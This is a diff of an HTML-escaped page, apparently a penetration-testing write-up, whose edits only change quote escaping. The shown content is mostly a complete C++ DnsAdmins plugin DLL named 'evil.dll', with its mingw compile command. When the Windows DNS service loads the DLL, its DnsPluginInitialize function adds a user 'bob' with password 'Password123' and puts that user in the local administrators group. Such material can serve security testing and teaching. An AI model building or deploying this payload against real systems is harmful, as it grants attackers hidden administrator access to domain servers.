@@ -35,29 +35,29 @@
 &lt;/ul&gt;
 &lt;h2 id=&#34;compiling&#34;&gt;Compiling&lt;/h2&gt;
 &lt;p&gt;&amp;hellip; here is the super exciting output from compiling the DLL&amp;hellip;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@kali:~/dnsadmin# x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~/dnsadmin# x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
 root@kali:~/dnsadmin# 
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;example-code&#34;&gt;Example Code&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
 #include &amp;lt;stdlib.h&amp;gt;
 
 
 // Here so I remember how to compile it.
 // x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
 
-extern &amp;quot;C&amp;quot; __declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2)
+extern &amp;#34;C&amp;#34; __declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2)
 {
-  system(&amp;quot;net.exe user bob Password123 /add&amp;quot;);
-  system(&amp;quot;net.exe localgroup administrators bob /add&amp;quot;);
+  system(&amp;#34;net.exe user bob Password123 /add&amp;#34;);
+  system(&amp;#34;net.exe localgroup administrators bob /add&amp;#34;);
   return 0;
 }
 
-extern &amp;quot;C&amp;quot; __declspec(dllexport) int DnsPluginCleanup()
+extern &amp;#34;C&amp;#34; __declspec(dllexport) int DnsPluginCleanup()
 {
   return 0;
 }
 
-extern &amp;quot;C&amp;quot; __declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
+extern &amp;#34;C&amp;#34; __declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
 {
   return 0;
 }
@@ -68,19 +68,19 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
     switch (fdwReason)
     {
     case DLL_PROCESS_ATTACH:
-        OutputDebugString(&amp;quot;DLL_PROCESS_ATTACH&amp;quot;);
+        OutputDebugString(&amp;#34;DLL_PROCESS_ATTACH&amp;#34;);
         break;
 
     case DLL_THREAD_ATTACH:
-        OutputDebugString(&amp;quot;DLL_THREAD_ATTACH&amp;quot;);
+        OutputDebugString(&amp;#34;DLL_THREAD_ATTACH&amp;#34;);
         break;
 
     case DLL_THREAD_DETACH:
-        OutputDebugString(&amp;quot;DLL_THREAD_DETACH&amp;quot;);
+        OutputDebugString(&amp;#34;DLL_THREAD_DETACH&amp;#34;);
         break;
 
     case DLL_PROCESS_DETACH:
-        OutputDebugString(&amp;quot;DLL_PROCESS_DETACH&amp;quot;);
+        OutputDebugString(&amp;#34;DLL_PROCESS_DETACH&amp;#34;);
         break;
     }
 
